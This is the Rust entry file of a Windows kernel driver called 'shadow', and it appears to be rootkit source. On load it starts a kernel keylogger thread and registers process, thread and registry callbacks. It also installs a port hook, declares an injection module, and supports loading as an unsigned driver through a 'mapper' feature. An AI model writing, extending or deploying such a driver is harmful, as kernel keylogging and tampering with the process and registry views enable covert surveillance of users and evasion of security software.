#![no_std]
#![allow(unused_must_use)]
#![allow(unreachable_code)]
#![allow(unused_variables)]

extern crate alloc;

use {
    utils::uni,
    port::Port,
    core::ptr::null_mut, 
    kernel_log::KernelLogger,
    crate::utils::ioctls::IOCTL_MAP, 
    misc::keylogger::{keylogger, SHUTDOWN}, 
    wdk_sys::{ntddk::*, _MODE::KernelMode, *}
};

#[cfg(not(feature = "mapper"))]
use {
    process::{on_pre_open_process, CALLBACK_REGISTRATION_HANDLE_PROCESS},
    thread::{on_pre_open_thread, CALLBACK_REGISTRATION_HANDLE_THREAD},
    registry::{registry_callback, CALLBACK_REGISTRY},
};

#[cfg(not(feature = "mapper"))]
pub mod registry;
pub mod callback;
pub mod misc;
pub mod driver;
pub mod internals;
pub mod process;
pub mod thread;
pub mod module;
pub mod injection;
pub mod port;
pub mod utils;

/// The name of the device in the device namespace.
const DEVICE_NAME: &str = "\\Device\\shadow";

/// The name of the device in the DOS device namespace.
const DOS_DEVICE_NAME: &str = "\\??\\shadow";

/// Driver input function.
///
/// This function is called by the system when the driver is loaded.
///
/// # Parameters
/// 
/// - `driver_object`: Pointer to the driver object.
/// - `registry_path`: Pointer to the Unicode string that specifies the driver's registry path.
///
/// # Returns
/// 
/// - `NTSTATUS`: Status code indicating the success or failure of the operation.
///
/// Reference: WDF expects a symbol with the name DriverEntry
#[export_name = "DriverEntry"]
pub unsafe extern "system" fn driver_entry(
    driver: &mut DRIVER_OBJECT,
    registry_path: PCUNICODE_STRING,
) -> NTSTATUS {
    KernelLogger::init(log::LevelFilter::Info).expect("Failed to initialize logger");
    
    #[cfg(feature = "mapper")] {
        use internals::IoCreateDriver;

        const DRIVER_NAME: &str = "\\Driver\\shadow";
        let mut driver_name = uni::str_to_unicode(DRIVER_NAME).to_unicode();
        let status = IoCreateDriver(&mut driver_name, Some(shadow_entry));
        if !NT_SUCCESS(status) {
            log::error!("IoCreateDriver Failed With Status: {status}");
        }
        return status;
    }

    shadow_entry(driver, registry_path)
}

/// Driver input function.
///
/// This function is called by the system when the driver is loaded. It is responsible for
/// initializing the driver, creating the device object and setting up the symbolic link.
///
/// # Parameters
/// 
/// - `driver_object`: Pointer to the driver object.
/// - `_registry_path`: Pointer to the Unicode string that specifies the driver's registry path.
///
/// # Returns
/// 
/// - `NTSTATUS`: Status code indicating the success or failure of the operation.
/// 
pub unsafe extern "system" fn shadow_entry(
    driver: &mut DRIVER_OBJECT,
    _registry_path: PCUNICODE_STRING,
) -> NTSTATUS {
    log::info!("Shadow Loaded");

    let device_name = uni::str_to_unicode(DEVICE_NAME);
    let dos_device_name = uni::str_to_unicode(DOS_DEVICE_NAME);
    let mut device_object: *mut DEVICE_OBJECT = core::ptr::null_mut();
    let mut status = IoCreateDevice(
        driver,
        0,
        &mut device_name.to_unicode(),
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        0,
        &mut device_object,
    );

    if !NT_SUCCESS(status) {
        log::error!("IoCreateDevice Failed With Status: {status}");
        return status;
    }

    driver.DriverUnload = Some(driver_unload);
    driver.MajorFunction[IRP_MJ_CREATE as usize] = Some(driver_close);
    driver.MajorFunction[IRP_MJ_CLOSE as usize] = Some(driver_close);
    driver.MajorFunction[IRP_MJ_DEVICE_CONTROL as usize] = Some(device_control);

    status = IoCreateSymbolicLink(&mut dos_device_name.to_unicode(),&mut device_name.to_unicode());

    if !NT_SUCCESS(status) {
        IoDeleteDevice(device_object);
        log::error!("IoCreateSymbolicLink Failed With Status: {status}");
        return status;
    }

    let mut h_thread: HANDLE = core::ptr::null_mut();
    status = PsCreateSystemThread(
        &mut h_thread,
        THREAD_ALL_ACCESS,
        null_mut(),
        null_mut(),
        null_mut(),
        Some(keylogger),
        null_mut(),
    );

    if !NT_SUCCESS(status) {
        IoDeleteDevice(device_object);
        log::error!("PsCreateSystemThread Failed With Status: {status}");
        return status;
    }

    #[cfg(feature = "mapper")] {
        (*device_object).Flags |= DO_BUFFERED_IO;
        (*device_object).Flags &= !DO_DEVICE_INITIALIZING;
    }

    #[cfg(not(feature = "mapper"))] {
        status = register_callbacks(driver);
        if !NT_SUCCESS(status) {
            log::error!("register_callbacks Failed With Status: {status}");
            return status;
        }
    }

    let status = unsafe { Port::install_hook() };

    STATUS_SUCCESS
}

/// Handles device control commands (IOCTL).
///
/// This function is responsible for processing IOCTL commands received by the driver and executing the corresponding actions.
///
/// # Parameters
/// 
/// - `_device`: Pointer to the device object (not used in this function).
/// - `irp`: Pointer to the I/O request packet (IRP) that contains the information about the device control request.
///
/// # Returns
/// 
/// - `NTSTATUS`: Status code indicating the success or failure of the operation.
/// 
pub unsafe extern "C" fn device_control(_device: *mut DEVICE_OBJECT, irp: *mut IRP) -> NTSTATUS {
    let stack = (*irp).Tail.Overlay.__bindgen_anon_2.__bindgen_anon_1.CurrentStackLocation;
    let control_code = (*stack).Parameters.DeviceIoControl.IoControlCode;
    
    let status = if let Some(handler) = IOCTL_MAP.get(&control_code) {
        handler(irp, stack)
    } else {
        STATUS_INVALID_DEVICE_REQUEST
    };

    (*irp).IoStatus.__bindgen_anon_1.Status = status;
    IofCompleteRequest(irp, IO_NO_INCREMENT as i8);

    status
}

/// Closes an open instance of the device.
///
/// This function is called when an open instance of the device is closed.
/// It marks the I/O request (IRP) as successfully completed.
///
/// # Parameters
/// 
/// - `_device_object`: Pointer to the associated device object (not used in this function).
/// - `irp`: Pointer to the I/O request packet (IRP) containing the information about the close request.
///
/// # Returns
/// 
/// - `NTSTATUS`: Status code indicating the success of the operation (always returns `STATUS_SUCCESS`).
///
pub unsafe extern "C" fn driver_close(_device_object: *mut DEVICE_OBJECT, irp: *mut IRP) -> NTSTATUS {
    (*irp).IoStatus.__bindgen_anon_1.Status = STATUS_SUCCESS;
    (*irp).IoStatus.Information = 0;
    IofCompleteRequest(irp, IO_NO_INCREMENT as i8);
    STATUS_SUCCESS
}

/// Download the system driver.
///
/// This function is called when the driver is being unloaded from the system.
/// It removes the symbolic link and deletes the device object associated with the driver.
///
/// # Parameters
/// 
/// - `driver_object`: Pointer to the driver object being unloaded.
///
pub unsafe extern "C" fn driver_unload(driver_object: *mut DRIVER_OBJECT) {
    log::info!("Unloading driver");

    SHUTDOWN = true;
    
    let hook_status = Port::uninstall_hook();
    if !NT_SUCCESS(hook_status) {
        log::error!("Failed to uninstall hook before unload");
    }

    let mut interval = LARGE_INTEGER {
        QuadPart: -50 * 1000_i64 * 1000_i64,
    };

    KeDelayExecutionThread(KernelMode as i8, 0, &mut interval);

    let dos_device_name = uni::str_to_unicode(DOS_DEVICE_NAME);
    IoDeleteSymbolicLink(&mut dos_device_name.to_unicode());
    IoDeleteDevice((*driver_object).DeviceObject);

    #[cfg(not(feature = "mapper"))] {
        ObUnRegisterCallbacks(process::CALLBACK_REGISTRATION_HANDLE_PROCESS);
        ObUnRegisterCallbacks(CALLBACK_REGISTRATION_HANDLE_THREAD);
        CmUnRegisterCallback(CALLBACK_REGISTRY);
    }

    let mut interval = LARGE_INTEGER {
        QuadPart: -1 * -(50 * 1000_i64),
    };

    KeDelayExecutionThread(KernelMode as i8, 0, &mut interval);

    log::info!("Shadow Unload");
}

/// Register Callbacks.
///
/// # Parameters
/// 
/// - `driver_object`: Pointer to the driver object being unloaded.
/// 
/// # Returns
/// 
/// - `NTSTATUS`: Status code indicating the success of the operation (always returns `STATUS_SUCCESS`).
///
#[cfg(not(feature = "mapper"))]
pub unsafe fn register_callbacks(driver_object: &mut DRIVER_OBJECT) -> NTSTATUS {
    let mut status;

    // Creating callbacks related to Process operations
    let mut op_reg = OB_OPERATION_REGISTRATION {
        ObjectType: PsProcessType,
        Operations: OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
        PreOperation: Some(on_pre_open_process),
        PostOperation: None,
    };
    let altitude = uni::str_to_unicode("31243.5222");
    let mut cb_reg = OB_CALLBACK_REGISTRATION {
        Version: OB_FLT_REGISTRATION_VERSION as u16,
        OperationRegistrationCount: 1,
        Altitude: altitude.to_unicode(),
        RegistrationContext: core::ptr::null_mut(),
        OperationRegistration: &mut op_reg,
    };

    status = ObRegisterCallbacks(&mut cb_reg,core::ptr::addr_of_mut!(CALLBACK_REGISTRATION_HANDLE_PROCESS));
    if !NT_SUCCESS(status) {
        log::error!("ObRegisterCallbacks (Process) Failed With Status: {status}");
        return status;
    }

    // Creating callbacks related to thread operations
    let mut op_reg = OB_OPERATION_REGISTRATION {
        ObjectType: PsThreadType,
        Operations: OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
        PreOperation: Some(on_pre_open_thread),
        PostOperation: None,
    };
    let altitude = uni::str_to_unicode("31243.5223");
    let mut cb_reg = OB_CALLBACK_REGISTRATION {
        Version: OB_FLT_REGISTRATION_VERSION as u16,
        OperationRegistrationCount: 1,
        Altitude: altitude.to_unicode(),
        RegistrationContext: core::ptr::null_mut(),
        OperationRegistration: &mut op_reg,
    };

    status = ObRegisterCallbacks(&mut cb_reg,core::ptr::addr_of_mut!(CALLBACK_REGISTRATION_HANDLE_THREAD));
    if !NT_SUCCESS(status) {
        log::error!("ObRegisterCallbacks (Thread) Failed With Status: {status}");
        return status;
    }

    // Creating callbacks related to registry operations
    let mut altitude = uni::str_to_unicode("31422.6172").to_unicode();
    status = CmRegisterCallbackEx(
        Some(registry_callback),
        &mut altitude,
        driver_object as *mut DRIVER_OBJECT as *mut core::ffi::c_void,
        null_mut(),
        core::ptr::addr_of_mut!(CALLBACK_REGISTRY),
        null_mut(),
    );

    if !NT_SUCCESS(status) {
        log::error!("CmRegisterCallbackEx Failed With Status: {status}");
        return status;
    }

    status
}
